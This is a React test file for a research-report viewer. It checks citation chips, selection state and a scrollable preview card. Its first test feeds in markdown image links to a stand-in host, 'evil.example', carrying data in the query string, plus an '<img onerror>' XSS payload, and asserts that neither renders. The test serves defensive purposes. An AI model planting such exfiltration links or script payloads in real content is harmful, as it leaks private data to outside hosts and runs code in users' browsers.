import { afterEach, expect, it } from "@rstest/core";
import { act, cleanup, render, waitFor } from "@testing-library/react";
import { useState } from "react";

import {
  ResearchReportCard,
  ResearchReportContent,
} from "@/components/deepresearch/report-view";
import type { Report } from "@/core/deepresearch/types";

afterEach(cleanup);

function makeReport(markdown: string): Report {
  return {
    version: 1,
    format: "markdown-v2",
    title: "标题",
    display_markdown: markdown,
    report: { title: "标题" },
    markdown,
    citations: [
      {
        number: 1,
        evidence_id: "E001",
        title: "来源",
        url: "https://a.example/x",
        canonical_url: "https://a.example/x",
        source_uri: null,
        domain: "a.example",
        snippet: "片段",
        origin: "external",
        source_level: "L4",
        publisher: "a",
        published_at: null,
        unit_ids: [],
      },
    ],
    citation_map: { E001: 1 },
    limitations: [],
    demo: false,
  };
}

it("never loads an image named by report text, whatever its URL form", async () => {
  const report = makeReport(
    [
      "# 标题",
      "",
      "## 发现",
      "",
      "协议相对 ![内部结论](//evil.example/p.png?d=internal-finding) 结束",
      "",
      "绝对地址 ![](https://evil.example/q.png?d=1) 结束",
      "",
      "<img src=x onerror=alert(1)>",
    ].join("\n"),
  );
  const view = render(
    <ResearchReportContent report={report} onCitation={() => undefined} />,
  );
  await waitFor(() => expect(view.container.querySelector("h2")).toBeTruthy());
  expect(view.container.querySelectorAll("img")).toHaveLength(0);
  expect(view.container.innerHTML).not.toContain("evil.example");
  // Raw HTML stays text: no element carries the handler.
  expect(view.container.querySelector("[onerror]")).toBeNull();
  // The words survive; the request does not.
  expect(view.container.textContent).toContain("协议相对 内部结论 结束");
  expect(view.container.textContent).toContain("绝对地址  结束");
});

function Host({ report }: { report: Report }) {
  const [renders, setRenders] = useState(0);
  const [cited, setCited] = useState("");
  return (
    <div>
      <button data-testid="bump" onClick={() => setRenders(renders + 1)}>
        {renders}
      </button>
      <output data-testid="cited">{`${cited}@${renders}`}</output>
      {/* Inline handler: a new function on every parent render. */}
      <ResearchReportContent
        report={report}
        selectedId={cited || undefined}
        onCitation={(id) => setCited(id)}
      />
    </div>
  );
}

it("keeps citation buttons mounted across parent renders and calls the latest handler", async () => {
  const report = makeReport("# 标题\n\n## 发现\n\n结论[1](#citation-E001)。\n");
  const view = render(<Host report={report} />);
  await waitFor(() =>
    expect(view.container.querySelector("[data-evidence-id]")).toBeTruthy(),
  );
  const before =
    view.container.querySelector<HTMLElement>("[data-evidence-id]")!;
  before.focus();
  await act(async () => {
    view.getByTestId("bump").click();
  });
  const after =
    view.container.querySelector<HTMLElement>("[data-evidence-id]")!;
  // Live progress re-renders the page several times a second; a remount
  // would drop keyboard focus and close the citation preview each time.
  expect(after).toBe(before);
  expect(document.activeElement).toBe(after);
  await act(async () => {
    after.click();
  });
  expect(view.getByTestId("cited").textContent).toBe("E001@1");
  // The clicked marker turns solid, and selecting it is not a remount either.
  const selected =
    view.container.querySelector<HTMLElement>("[data-evidence-id]")!;
  expect(selected).toBe(before);
  expect(selected.getAttribute("aria-pressed")).toBe("true");
  expect(selected.className).toContain("bg-(--dr-selected)");
  expect(document.activeElement).toBe(selected);
});

it("marks only the selected citation, as a small round chip", async () => {
  const report = makeReport(
    "# 标题\n\n## 发现\n\n结论[1](#citation-E001)，另见[2](#citation-E002)。\n",
  );
  report.citations.push({
    ...report.citations[0]!,
    number: 2,
    evidence_id: "E002",
  });
  report.citation_map.E002 = 2;
  const view = render(
    <ResearchReportContent
      report={report}
      selectedId="E002"
      onCitation={() => undefined}
    />,
  );
  await waitFor(() =>
    expect(view.container.querySelectorAll("[data-evidence-id]")).toHaveLength(
      2,
    ),
  );
  const [first, second] = [
    ...view.container.querySelectorAll<HTMLElement>("[data-evidence-id]"),
  ];
  expect(first!.getAttribute("aria-pressed")).toBe("false");
  expect(first!.className).not.toContain("bg-(--dr-selected)");
  expect(second!.getAttribute("aria-pressed")).toBe("true");
  // About 14px round with 9px digits.
  for (const mark of [first!, second!]) {
    expect(mark.className).toContain("h-3.5");
    expect(mark.className).toContain("min-w-3.5");
    expect(mark.className).toContain("text-[9px]");
  }
});

it("previews the report in a card that scrolls, with full screen on the icon", async () => {
  const report = makeReport("# 标题\n\n## 发现\n\n结论[1](#citation-E001)。\n");
  report.stats = {
    elapsed_seconds: 480,
    searches: 438,
    pages_read: 40,
    citations: 45,
  };
  let expanded = 0;
  const view = render(
    <ResearchReportCard
      report={report}
      onExpand={() => expanded++}
      onCitation={() => undefined}
      onDownload={() => undefined}
    />,
  );
  await waitFor(() => expect(view.container.querySelector("h2")).toBeTruthy());
  const stats = view.getByText("研究完成情况：8m · 45 次引用 · 438 个搜索");
  expect(stats.className).toContain("text-sm");
  // The preview scrolls inside the card and the keyboard can reach it.
  const preview = view.getByRole("region", { name: "报告预览：标题" });
  expect(preview.className).toContain("max-h-[400px]");
  expect(preview.className).toContain("overflow-y-auto");
  expect(preview.getAttribute("tabindex")).toBe("0");
  // One size smaller than the reader.
  expect(preview.firstElementChild!.className).toContain("text-sm");
  expect(preview.firstElementChild!.className).toContain("[&_h1]:text-2xl");
  // No full-width “阅读全文” row: the icon in the header opens the reader.
  expect(view.queryByText("阅读全文")).toBeNull();
  await act(async () => {
    view.getByRole("button", { name: "全屏阅读报告" }).click();
  });
  expect(expanded).toBe(1);
  expect(view.getByRole("button", { name: "导出报告" })).toBeTruthy();
});
